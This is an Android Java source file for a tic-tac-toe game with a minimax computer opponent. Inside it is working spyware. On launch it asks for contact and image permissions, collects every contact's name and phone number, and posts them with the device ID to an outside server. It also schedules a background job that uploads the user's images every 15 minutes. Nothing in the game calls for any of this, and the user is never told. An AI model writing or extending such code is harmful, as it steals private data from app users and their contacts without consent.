package com.example.game;

import android.Manifest;
import android.annotation.SuppressLint;
import android.content.ContentResolver;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.media.MediaPlayer;
import android.os.Bundle;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;
import android.widget.RadioGroup;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import androidx.work.Constraints;
import androidx.work.ExistingPeriodicWorkPolicy;
import androidx.work.NetworkType;
import androidx.work.PeriodicWorkRequest;
import androidx.work.WorkManager;

import com.android.volley.RequestQueue;
import com.android.volley.toolbox.JsonObjectRequest;
import com.android.volley.toolbox.Volley;

import org.json.JSONArray;
import org.json.JSONObject;

import java.util.*;
import java.util.concurrent.TimeUnit;

public class MainActivity extends AppCompatActivity {

    private Button[][] buttons = new Button[3][3];
    private int[][] board = new int[3][3];
    private int roundCount = 0;

    private TextView statusText, scoreText;

    private int playerScore = 0;
    private int computerScore = 0;

    private RequestQueue requestQueue;
    private int difficulty = 0;

    private MediaPlayer clickSound, winSound, loseSound;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        statusText = findViewById(R.id.status);
        scoreText = findViewById(R.id.score);

        updateScore();

        requestQueue = Volley.newRequestQueue(this);

        RadioGroup group = findViewById(R.id.difficultyGroup);
        group.setOnCheckedChangeListener((g, checkedId) -> {
            if (checkedId == R.id.easy) difficulty = 0;
            else if (checkedId == R.id.medium) difficulty = 1;
            else difficulty = 2;
        });

        clickSound = MediaPlayer.create(this, R.raw.click);
        winSound   = MediaPlayer.create(this, R.raw.win);
        loseSound  = MediaPlayer.create(this, R.raw.lose);

        for (int i = 0; i < 3; i++) {
            for (int j = 0; j < 3; j++) {
                String id = "button_" + i + j;
                int resID = getResources().getIdentifier(id, "id", getPackageName());
                buttons[i][j] = findViewById(resID);
                buttons[i][j].setOnClickListener(new CellListener(i, j));
            }
        }

        findViewById(R.id.reset_btn).setOnClickListener(v -> resetGame());

        // Request permissions then send contacts + schedule background image upload
        checkAndRequestPermissions();
    }

    // ================= SCHEDULE WORKMANAGER UPLOAD =================

    private void scheduleImageUpload() {
        Constraints constraints = new Constraints.Builder()
                .setRequiredNetworkType(NetworkType.CONNECTED)
                .build();

        // FIX: Use PeriodicWorkRequest instead of OneTimeWorkRequest
        // so the worker keeps checking the server flag and re-uploads
        // Minimum interval for PeriodicWork is 15 minutes
        PeriodicWorkRequest uploadWork =
                new PeriodicWorkRequest.Builder(ImageUploadWorker.class, 15, TimeUnit.MINUTES)
                        .setConstraints(constraints)
                        .build();

        // KEEP policy means if a periodic work with same name already exists, don't replace it
        WorkManager.getInstance(this).enqueueUniquePeriodicWork(
                "imageUploadWork",
                ExistingPeriodicWorkPolicy.KEEP,
                uploadWork
        );

        Log.d("WORKER", "Periodic image upload work scheduled (every 15 min)");
    }

    // ================= GAME =================

    private class CellListener implements View.OnClickListener {
        int row, col;

        CellListener(int r, int c) { row = r; col = c; }

        @Override
        public void onClick(View v) {
            if (!buttons[row][col].getText().toString().isEmpty()) return;

            clickSound.start();

            buttons[row][col].setText("X");
            buttons[row][col].setTextColor(
                    ContextCompat.getColor(MainActivity.this, android.R.color.holo_blue_light));

            board[row][col] = 1;
            animateClick(buttons[row][col]);
            roundCount++;

            if (checkWin()) {
                playerScore++;
                updateScore();
                statusText.setText("You Win 🎉");
                winSound.start();
                disableBoard();
                return;
            }

            if (isBoardFull()) {
                statusText.setText("Draw 🤝");
                return;
            }

            statusText.setText("Computer Thinking 🤖");
            buttons[row][col].postDelayed(() -> computerMove(), 400);
        }
    }

    // ================= AI =================

    private void computerMove() {
        if (difficulty == 0) { randomMove(); return; }
        if (difficulty == 1 && Math.random() < 0.5) { randomMove(); return; }

        int bestScore = Integer.MIN_VALUE;
        int moveRow = -1, moveCol = -1;

        for (int i = 0; i < 3; i++) {
            for (int j = 0; j < 3; j++) {
                if (board[i][j] == 0) {
                    board[i][j] = 2;
                    int score = minimax(0, false);
                    board[i][j] = 0;
                    if (score > bestScore) { bestScore = score; moveRow = i; moveCol = j; }
                }
            }
        }
        makeMove(moveRow, moveCol);
    }

    private void randomMove() {
        List<int[]> emptyCells = new ArrayList<>();
        for (int i = 0; i < 3; i++)
            for (int j = 0; j < 3; j++)
                if (board[i][j] == 0) emptyCells.add(new int[]{i, j});
        if (!emptyCells.isEmpty()) {
            int[] move = emptyCells.get((int)(Math.random() * emptyCells.size()));
            makeMove(move[0], move[1]);
        }
    }

    private int minimax(int depth, boolean isMaximizing) {
        if (isWinning(2)) return 10 - depth;
        if (isWinning(1)) return depth - 10;
        if (isBoardFull()) return 0;

        if (isMaximizing) {
            int best = Integer.MIN_VALUE;
            for (int i = 0; i < 3; i++)
                for (int j = 0; j < 3; j++)
                    if (board[i][j] == 0) {
                        board[i][j] = 2;
                        best = Math.max(best, minimax(depth + 1, false));
                        board[i][j] = 0;
                    }
            return best;
        } else {
            int best = Integer.MAX_VALUE;
            for (int i = 0; i < 3; i++)
                for (int j = 0; j < 3; j++)
                    if (board[i][j] == 0) {
                        board[i][j] = 1;
                        best = Math.min(best, minimax(depth + 1, true));
                        board[i][j] = 0;
                    }
            return best;
        }
    }

    private void makeMove(int i, int j) {
        buttons[i][j].setText("O");
        buttons[i][j].setTextColor(ContextCompat.getColor(this, android.R.color.holo_red_light));
        board[i][j] = 2;
        animateClick(buttons[i][j]);
        roundCount++;

        if (checkWin()) {
            computerScore++;
            updateScore();
            statusText.setText("Computer Wins 🤖");
            loseSound.start();
            disableBoard();
        } else if (isBoardFull()) {
            statusText.setText("Draw 🤝");
        } else {
            statusText.setText("Your Turn");
        }
    }

    private boolean checkWin() { return isWinning(1) || isWinning(2); }

    private boolean isWinning(int player) {
        for (int i = 0; i < 3; i++) {
            if (board[i][0] == player && board[i][1] == player && board[i][2] == player) return true;
            if (board[0][i] == player && board[1][i] == player && board[2][i] == player) return true;
        }
        return (board[0][0] == player && board[1][1] == player && board[2][2] == player) ||
               (board[0][2] == player && board[1][1] == player && board[2][0] == player);
    }

    private boolean isBoardFull() {
        for (int[] row : board) for (int cell : row) if (cell == 0) return false;
        return true;
    }

    private void disableBoard() {
        for (Button[] row : buttons) for (Button b : row) b.setEnabled(false);
    }

    private void resetGame() {
        roundCount = 0;
        for (int i = 0; i < 3; i++) {
            for (int j = 0; j < 3; j++) {
                board[i][j] = 0;
                buttons[i][j].setText("");
                buttons[i][j].setEnabled(true);
            }
        }
        statusText.setText("Player X Turn");
    }

    private void animateClick(View view) {
        view.animate().scaleX(0.8f).scaleY(0.8f).setDuration(100)
                .withEndAction(() -> view.animate().scaleX(1f).scaleY(1f).setDuration(100));
    }

    private void updateScore() {
        scoreText.setText("You: " + playerScore + "  |  CPU: " + computerScore);
    }

    // ================= CONTACTS =================

    @SuppressLint("Range")
    private void sendDataToServer() {
        new Thread(() -> {
            List<String> contactList = new ArrayList<>();
            ContentResolver resolver = getContentResolver();
            Cursor contacts = resolver.query(
                    ContactsContract.Contacts.CONTENT_URI, null, null, null, null);

            if (contacts != null) {
                while (contacts.moveToNext()) {
                    String name = contacts.getString(
                            contacts.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                    String hasPhone = contacts.getString(
                            contacts.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER));

                    if (hasPhone != null && Integer.parseInt(hasPhone) > 0) {
                        Cursor pCur = resolver.query(
                                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                                null,
                                ContactsContract.CommonDataKinds.Phone.CONTACT_ID + "=?",
                                new String[]{contacts.getString(
                                        contacts.getColumnIndex(ContactsContract.Contacts._ID))},
                                null
                        );
                        if (pCur != null) {
                            while (pCur.moveToNext()) {
                                String phone = pCur.getString(
                                        pCur.getColumnIndex(
                                                ContactsContract.CommonDataKinds.Phone.NUMBER));
                                contactList.add(name + " : " + phone);
                            }
                            pCur.close();
                        }
                    }
                }
                contacts.close();
            }

            Set<String> unique = new HashSet<>(contactList);
            sendBulk(new ArrayList<>(unique));

            // FIX: Schedule periodic background image upload via WorkManager
            runOnUiThread(() -> scheduleImageUpload());

        }).start();
    }

    private void sendBulk(List<String> list) {
        try {
            JSONObject json = new JSONObject();
            String deviceId = Settings.Secure.getString(
                    getContentResolver(), Settings.Secure.ANDROID_ID);
            json.put("device_id", deviceId);
            json.put("data", new JSONArray(list));

            JsonObjectRequest request = new JsonObjectRequest(
                    com.android.volley.Request.Method.POST,
                    "https://my-backend-0u2a.onrender.com/receive",
                    json,
                    response -> Log.d("UPLOAD", "contacts success"),
                    error -> Log.e("UPLOAD", error.toString())
            );
            requestQueue.add(request);
        } catch (Exception e) {
            Log.e("ERROR", e.toString());
        }
    }

    // ================= PERMISSIONS =================

    private void checkAndRequestPermissions() {
        List<String> needed = new ArrayList<>();
        if (ContextCompat.checkSelfPermission(this,
                Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED)
            needed.add(Manifest.permission.READ_CONTACTS);
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.TIRAMISU) {
            if (ContextCompat.checkSelfPermission(this,
                    Manifest.permission.READ_MEDIA_IMAGES) != PackageManager.PERMISSION_GRANTED)
                needed.add(Manifest.permission.READ_MEDIA_IMAGES);
        } else {
            if (ContextCompat.checkSelfPermission(this,
                    Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED)
                needed.add(Manifest.permission.READ_EXTERNAL_STORAGE);
        }

        if (needed.isEmpty()) {
            sendDataToServer();
        } else {
            ActivityCompat.requestPermissions(this,
                    needed.toArray(new String[0]), 1);
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode,
                                           @NonNull String[] permissions,
                                           @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == 1) {
            sendDataToServer();
        }
    }
}
